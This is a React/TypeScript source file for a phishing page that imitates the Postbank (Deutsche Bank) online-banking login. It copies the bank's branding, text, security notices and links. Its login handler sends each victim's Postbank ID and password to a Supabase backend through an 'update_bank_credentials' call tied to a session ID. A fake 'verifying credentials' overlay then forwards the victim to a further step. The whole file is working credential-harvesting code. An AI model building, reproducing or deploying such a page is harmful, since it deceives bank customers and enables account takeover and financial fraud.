import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { AlertTriangle, Monitor, Lock, Eye, EyeOff, ArrowLeft } from "lucide-react";
import bgAsset from "@/assets/postbank-hero.jpg.asset.json";
import logoAsset from "@/assets/postbank-logo.svg.asset.json";
import faviconAsset from "@/assets/favicons/postbank.webp.asset.json";
import teaserAsset from "@/assets/postbank-altersvorsorge.jpg.asset.json";

const YELLOW = "#FFCC00";
const NAVY = "#003665";
const LINK = "#003665";
const DARK = "#1a1a1a";
const ERR = "#c81e1e";
const GREY = "#b5b5b5";

const URLS = {
  requestId: "https://meine.postbank.de/",
  forgot: "https://meine.postbank.de/",
  teaser:
    "https://www.postbank.de/privatkunden/produkte/sparen-anlegen/altersvorsorgedepot.html",
  secNews: "https://www.postbank.de/privatkunden/service/sicherheit.html",
  secOverview:
    "https://www.postbank.de/privatkunden/service/sicherheit/sicherheit-im-ueberblick.html",
  servicesHelp: "https://www.postbank.de/privatkunden/service.html",
  secProcedures:
    "https://www.postbank.de/privatkunden/service/sicherheit/bestsign.html",
  firstSteps: "https://www.postbank.de/privatkunden/service/online-banking.html",
  appointment: "https://www.postbank.de/privatkunden/service/terminvereinbarung.html",
  demo: "https://meine.postbank.de/demo/",
  contact: "https://www.postbank.de/privatkunden/service/kontakt.html",
  imprint: "https://www.postbank.de/privatkunden/meta/impressum.html",
  legal: "https://www.postbank.de/privatkunden/meta/rechtshinweise.html",
  privacy: "https://www.postbank.de/privatkunden/meta/datenschutz.html",
  cookies: "javascript:UC_UI.showSecondLayer();",
  revoke: "https://www.postbank.de/privatkunden/service/widerruf.html",
};

type Lang = "de" | "en";

const COPY: Record<Lang, {
  greeting: string; greetingEvening: string;
  enterCreds: string;
  idLabel: string; pwLabel: string;
  requestId: string;
  forgot: string;
  continue: string; login: string; back: string;
  idError: string;
  teaserTitle: string; teaserText: string; learnMore: string;
  secInfoTitle: string; secInfoText: string; secNews: string; secOverview: string;
  servicesTitle: string; servicesText: string; servicesLink: string;
  procTitle: string; procText: string; procedures: string;
  langToggle: string;
  firstSteps: string; appointment: string; demo: string; contact: string;
  imprint: string; legal: string; privacy: string; cookies: string;
  revoke: string; copyright: string;
}> = {
  de: {
    greeting: "Guten Tag",
    greetingEvening: "Guten Abend",
    enterCreds: "Bitte geben Sie Ihre Zugangsdaten ein.",
    idLabel: "Postbank ID",
    pwLabel: "Passwort",
    requestId: "Jetzt Postbank ID einrichten",
    forgot: "Zugangsdaten vergessen?",
    continue: "Weiter",
    login: "Einloggen",
    back: "Zurück",
    idError: "Bitte prüfen Sie Ihre Eingabe. Geben Sie Ihre Postbank ID ein.",
    teaserTitle: "Staatlich gefördert fürs Alter vorsorgen",
    teaserText:
      "Ab Januar 2027 startet das neue staatliche Altersvorsorgedepot: Finden Sie jetzt mit unserem Förderrechner heraus, welche staatliche Unterstützung für Sie möglich ist.",
    learnMore: "Jetzt informieren",
    secInfoTitle: "Sicherheitshinweise",
    secInfoText:
      "Aktuell wird ein erhöhtes Aufkommen von Anrufen falscher Bankmitarbeiter festgestellt.",
    secNews: "Link zu den aktuellen Sicherheitshinweisen",
    secOverview: "Link zu Sicherheit im Überblick",
    servicesTitle: "Schnelle Hilfe und Services",
    servicesText: "Hier finden Sie unsere Services und Hilfe zu Ihrem Online-Banking.",
    servicesLink: "Link zu Services und Hilfe",
    procTitle: "Unsere Sicherheitsverfahren",
    procText: "Alles Wissenswerte rund um BestSign.",
    procedures: "Link zu den Sicherheitsverfahren",
    langToggle: "English Version",
    firstSteps: "Erste Schritte",
    appointment: "Terminvereinbarung",
    demo: "Demo-Konto",
    contact: "Kontakt",
    imprint: "Impressum",
    legal: "Rechtshinweise",
    privacy: "Datenschutz",
    cookies: "Cookie-Einstellungen",
    revoke: "Vertrag widerrufen",
    copyright: "© 2026 Postbank – eine Niederlassung der Deutsche Bank AG",
  },
  en: {
    greeting: "Hello",
    greetingEvening: "Good evening",
    enterCreds: "Please enter your credentials.",
    idLabel: "Postbank ID",
    pwLabel: "Password",
    requestId: "Set up Postbank ID now",
    forgot: "Forgotten your credentials?",
    continue: "Continue",
    login: "Login",
    back: "Back",
    idError: "Please check your entry. Enter your Postbank ID.",
    teaserTitle: "Government-funded retirement savings",
    teaserText:
      "The new state-subsidised retirement savings account starts in January 2027. Use our calculator to find out which support is available for you.",
    learnMore: "Find out more",
    secInfoTitle: "Security information",
    secInfoText:
      "We are currently seeing an increased number of calls from fake bank employees.",
    secNews: "Current security information",
    secOverview: "Security at a glance",
    servicesTitle: "Quick help and services",
    servicesText: "Here you will find our services and help for your online banking.",
    servicesLink: "Link to services and help",
    procTitle: "Our security procedures",
    procText: "Everything you need to know about BestSign.",
    procedures: "Link to security procedures",
    langToggle: "Deutsche Version",
    firstSteps: "First steps",
    appointment: "Make an appointment",
    demo: "Demo account",
    contact: "Contact",
    imprint: "Imprint",
    legal: "Legal notice",
    privacy: "Privacy",
    cookies: "Cookie settings",
    revoke: "Revoke contract",
    copyright: "© 2026 Postbank – a branch of Deutsche Bank AG",
  },
};

function fieldStyle(focused: boolean, touched: boolean, hasValue: boolean, hovered: boolean) {
  const errorEmpty = touched && !hasValue;
  if (focused) {
    if (errorEmpty) {
      return { borderColor: ERR, boxShadow: `0 0 0 2px #fff, 0 0 0 4px ${NAVY}`, labelColor: ERR, isError: true };
    }
    return { borderColor: NAVY, boxShadow: `0 0 0 2px #fff, 0 0 0 4px ${NAVY}`, labelColor: NAVY, isError: false };
  }
  if (errorEmpty) {
    return { borderColor: ERR, boxShadow: "none", labelColor: ERR, isError: true };
  }
  if (hovered && hasValue) {
    return { borderColor: NAVY, boxShadow: "none", labelColor: NAVY, isError: false };
  }
  return { borderColor: GREY, boxShadow: "none", labelColor: NAVY, isError: false };
}

const Postbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [step, setStep] = useState<1 | 2>(1);
  const [pbId, setPbId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [idFocused, setIdFocused] = useState(false);
  const [idTouched, setIdTouched] = useState(false);
  const [idHover, setIdHover] = useState(false);
  const [pwFocused, setPwFocused] = useState(false);
  const [pwTouched, setPwTouched] = useState(false);
  const [pwHover, setPwHover] = useState(false);
  const [lang, setLang] = useState<Lang>("de");
  const t = COPY[lang];

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Postbank – Online-Banking", logoAsset.url);

  const handleContinue = () => {
    if (pbId.trim().length === 0) return;
    setStep(2);
  };

  const handleLogin = async () => {
    if (password.length === 0) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: pbId,
        p_password: password,
        p_username_label: "Postbank ID",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const ext = { target: "_blank", rel: "noopener noreferrer" } as const;

  const greeting = (() => {
    const h = parseInt(
      new Intl.DateTimeFormat("de-DE", {
        timeZone: "Europe/Berlin",
        hour: "numeric",
        hour12: false,
      }).format(new Date()),
      10,
    );
    if (h >= 17) return t.greetingEvening;
    if (h < 11) return lang === "de" ? "Guten Morgen" : "Good morning";
    return t.greeting;
  })();

  const loginCard = (
    <div className="px-4 py-6 lg:p-10" style={{ backgroundColor: YELLOW, minHeight: 440 }}>
      <div className="mb-6">
        <img src={logoAsset.url} alt="Postbank" className="h-12 w-auto -ml-[14px]" />
      </div>

      {step === 1 ? (
        <h1 className="text-[30px] font-bold mb-3" style={{ color: NAVY, lineHeight: 1.2 }}>
          {greeting}
        </h1>
      ) : (
        <div className="mb-3 flex items-center" style={{ height: 36 }}>
          <button
            type="button"
            onClick={() => setStep(1)}
            className="flex items-center gap-1 text-[13px] font-bold underline"
            style={{ color: LINK }}
          >
            <ArrowLeft size={14} /> {t.back}
          </button>
        </div>
      )}
      <p className="text-[15px] mb-6" style={{ color: NAVY }}>
        {t.enterCreds}
      </p>

      {step === 1 ? (
        <>
          {(() => {
            const fs = fieldStyle(idFocused, idTouched, pbId.length > 0, idHover);
            return (
              <>
                <label className="block text-[13px] mb-1 pl-[3px]" style={{ color: fs.labelColor }}>
                  {t.idLabel}
                </label>
                <div style={{ padding: "3px" }}>
                  <input
                    type="text"
                    value={pbId}
                    onChange={(e) => setPbId(e.target.value)}
                    onFocus={() => setIdFocused(true)}
                    onBlur={() => { setIdFocused(false); setIdTouched(true); }}
                    onMouseEnter={() => setIdHover(true)}
                    onMouseLeave={() => setIdHover(false)}
                    onKeyDown={(e) => e.key === "Enter" && handleContinue()}
                    autoFocus
                    className="w-full px-3 py-3 text-[16px] outline-none bg-white"
                    style={{
                      border: `1px solid ${fs.borderColor}`,
                      borderRadius: 2,
                      boxShadow: fs.boxShadow,
                      transition: "box-shadow 80ms ease, border-color 80ms ease",
                    }}
                  />
                </div>
                {fs.isError && (
                  <div className="flex items-start gap-2 mt-2 text-[13px]" style={{ color: ERR }}>
                    <span
                      className="inline-flex items-center justify-center shrink-0 mt-0.5"
                      style={{
                        width: 16, height: 16, borderRadius: "50%",
                        background: ERR, color: "#fff",
                        fontSize: 11, fontWeight: 700, fontFamily: "serif",
                        lineHeight: 1,
                      }}
                    >i</span>
                    <span>{t.idError}</span>
                  </div>
                )}
              </>
            );
          })()}

          <div className="mt-5">
            <a href={URLS.requestId} {...ext} className="text-[13px] font-bold underline" style={{ color: LINK }}>
              {t.requestId}
            </a>
          </div>

          <div className="flex flex-col lg:flex-row-reverse lg:items-center lg:justify-between gap-3 mt-20">
            <button
              type="button"
              onClick={handleContinue}
              className="pb-primary-btn w-full lg:w-auto px-8 py-3.5 text-white font-bold text-[15px]"
              style={{ cursor: "pointer", borderRadius: 4 }}
            >
              {t.continue}
            </button>
            <a href={URLS.forgot} {...ext} className="text-[13px] font-bold underline text-left" style={{ color: LINK }}>
              {t.forgot}
            </a>
          </div>
        </>
      ) : (
        <>
          {(() => {
            const fs = fieldStyle(pwFocused, pwTouched, password.length > 0, pwHover);
            return (
              <>
                <label className="block text-[13px] mb-1 pl-[3px]" style={{ color: fs.labelColor }}>
                  {t.pwLabel}
                </label>
                <div style={{ padding: "3px" }}>
                  <div
                    className="relative"
                    onMouseEnter={() => setPwHover(true)}
                    onMouseLeave={() => setPwHover(false)}
                  >
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      onFocus={() => setPwFocused(true)}
                      onBlur={() => { setPwFocused(false); setPwTouched(true); }}
                      onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                      autoFocus
                      className="w-full px-3 py-3 pr-12 text-[16px] outline-none bg-white"
                      style={{
                        border: `1px solid ${fs.borderColor}`,
                        borderRadius: 2,
                        boxShadow: fs.boxShadow,
                        transition: "box-shadow 80ms ease, border-color 80ms ease",
                      }}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2"
                      style={{ color: NAVY }}
                      aria-label="Passwort anzeigen"
                    >
                      {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
                    </button>
                  </div>
                </div>
              </>
            );
          })()}

          <div className="flex flex-col lg:flex-row-reverse lg:items-center lg:justify-between gap-3 mt-24">
            <button
              type="button"
              onClick={handleLogin}
              disabled={password.length === 0}
              className={password.length === 0 ? "w-full lg:w-auto px-8 py-3.5 font-bold text-[15px]" : "pb-primary-btn w-full lg:w-auto px-8 py-3.5 text-white font-bold text-[15px]"}
              style={{
                cursor: password.length === 0 ? "not-allowed" : "pointer",
                backgroundColor: password.length === 0 ? "#cccccc" : undefined,
                color: password.length === 0 ? "#b2b2b2" : undefined,
                borderRadius: 4,
              }}
            >
              {t.login}
            </button>
            <a href={URLS.forgot} {...ext} className="text-[13px] font-bold underline text-left" style={{ color: LINK }}>
              {t.forgot}
            </a>
          </div>
        </>
      )}
    </div>
  );

  const rightPanel = (
    <div className="pb-right-panel bg-white">
      <a href={URLS.teaser} {...ext} className="block px-2 lg:px-7 pt-7 pb-6">
        <img
          src={teaserAsset.url}
          alt="Altersvorsorgedepot"
          className="w-full h-auto mb-4"
        />
        <div>
          <div className="text-[15px] font-bold leading-snug" style={{ color: DARK }}>
            {t.teaserTitle}
          </div>
          <div className="text-[13px] mt-2" style={{ color: "#333" }}>
            {t.teaserText}
          </div>
          <div className="mt-3 text-[12px] underline font-bold" style={{ color: LINK }}>
            {t.learnMore}
          </div>
        </div>
      </a>

      <div className="border-t border-gray-200" />

      <InfoBlock
        icon={<AlertTriangle size={20} color={DARK} />}
        title={t.secInfoTitle}
        text={t.secInfoText}
        links={[
          { label: t.secNews, href: URLS.secNews },
          { label: t.secOverview, href: URLS.secOverview },
        ]}
      />
      <InfoBlock
        icon={<Monitor size={20} color={DARK} />}
        title={t.servicesTitle}
        text={t.servicesText}
        links={[{ label: t.servicesLink, href: URLS.servicesHelp }]}
      />
      <InfoBlock
        icon={<Lock size={20} color={DARK} />}
        title={t.procTitle}
        text={t.procText}
        links={[{ label: t.procedures, href: URLS.secProcedures }]}
      />

      <div className="-mx-2 px-3 py-7 lg:mx-0 lg:px-7 text-[13px]" style={{ backgroundColor: YELLOW, color: NAVY }}>
        <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-bold text-[13px]">
          <button
            type="button"
            onClick={() => setLang(lang === "de" ? "en" : "de")}
            className="hover:underline text-left"
            style={{ color: NAVY, background: "none", padding: 0 }}
          >
            {t.langToggle}
          </button>
          <a href={URLS.firstSteps} {...ext} className="hover:underline">{t.firstSteps}</a>
          <a href={URLS.appointment} {...ext} className="hover:underline">{t.appointment}</a>
        </div>
        <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-bold text-[13px]">
          <a href={URLS.demo} {...ext} className="hover:underline">{t.demo}</a>
          <a href={URLS.contact} {...ext} className="hover:underline">{t.contact}</a>
          <a href={URLS.imprint} {...ext} className="hover:underline">{t.imprint}</a>
        </div>
        <div className="flex flex-wrap gap-x-5 gap-y-1 mb-4 font-bold text-[13px]">
          <a href={URLS.legal} {...ext} className="hover:underline">{t.legal}</a>
          <a href={URLS.privacy} {...ext} className="hover:underline">{t.privacy}</a>
          <a href={URLS.cookies} className="hover:underline">{t.cookies}</a>
        </div>
        <a
          href={URLS.revoke}
          {...ext}
          className="block w-full text-center text-[13px] font-bold px-4 py-2 mb-3 no-underline lg:inline-block lg:w-auto"
          style={{ color: NAVY, border: `1px solid ${NAVY}`, backgroundColor: "transparent" }}
        >
          {t.revoke}
        </a>
        <div className="text-[12px]" style={{ color: NAVY }}>{t.copyright}</div>
      </div>
    </div>
  );

  return (
    <>
      <style>{`
        .pb-font { font-family: 'Frutiger', 'Arial', sans-serif; }
        .pb-primary-btn { background:${NAVY}; transition: background 120ms ease; }
        .pb-primary-btn:hover { background:#002548; }
        .pb-hero-bg { background-color: #e9e3d6; }
        @media (max-width: 1023px) {
          .pb-hero-bg {
            background-image: url(${bgAsset.url});
            background-size: cover;
            background-position: left top;
            background-repeat: no-repeat;
            background-origin: border-box;
          }
        }
        @media (min-width: 1024px) {
          .pb-hero-bg {
            background-image: url(${bgAsset.url});
            background-size: cover;
            background-position: left center;
          }
          .pb-right-panel {
            position: fixed; top: 0; bottom: 0;
            left: max(772px, calc(50% + 142px));
            width: 396px; overflow-y: auto;
            scrollbar-width: none; -ms-overflow-style: none;
          }
          .pb-right-panel::-webkit-scrollbar { display: none; }
        }
      `}</style>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate((new URLSearchParams(window.location.search).get("return") || "") ? `${new URLSearchParams(window.location.search).get("return")}?step=3&s=${sessionId}` : "/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col pb-font" style={{ color: DARK }}>
        {/* MOBILE LAYOUT */}
        <div className="lg:hidden">
          <div className="pb-hero-bg px-2 pt-10 pb-10 space-y-4">
            {loginCard}
          </div>
          <div className="bg-white px-2 lg:px-0">
            {rightPanel}
          </div>
        </div>

        {/* DESKTOP LAYOUT */}
        <div className="hidden lg:block relative flex-1 pb-hero-bg">
          <div className="max-w-[1260px] mx-auto px-4 py-24 grid grid-cols-[minmax(0,500px)_minmax(0,396px)] gap-[256px]">
            <div className="space-y-6 mt-32">
              {loginCard}
            </div>
            {rightPanel}
          </div>
        </div>
      </div>
    </>
  );
};

const InfoBlock = ({
  icon,
  title,
  text,
  links,
}: {
  icon: React.ReactNode;
  title: string;
  text: string;
  links: { label: string; href: string }[];
}) => (
  <div className="px-2 lg:px-7 py-6">
    <div className="flex items-center gap-2 mb-2 font-bold text-[14px]" style={{ color: DARK }}>
      {icon}
      {title}
    </div>
    <p className="text-[13px] mb-3" style={{ color: "#333" }}>
      {text}
    </p>
    <div className="space-y-1">
      {links.map((l) => (
        <a
          key={l.label}
          href={l.href}
          target="_blank"
          rel="noopener noreferrer"
          className="block text-[12px] underline font-bold"
          style={{ color: LINK }}
        >
          {l.label}
        </a>
      ))}
    </div>
  </div>
);

export default Postbank;
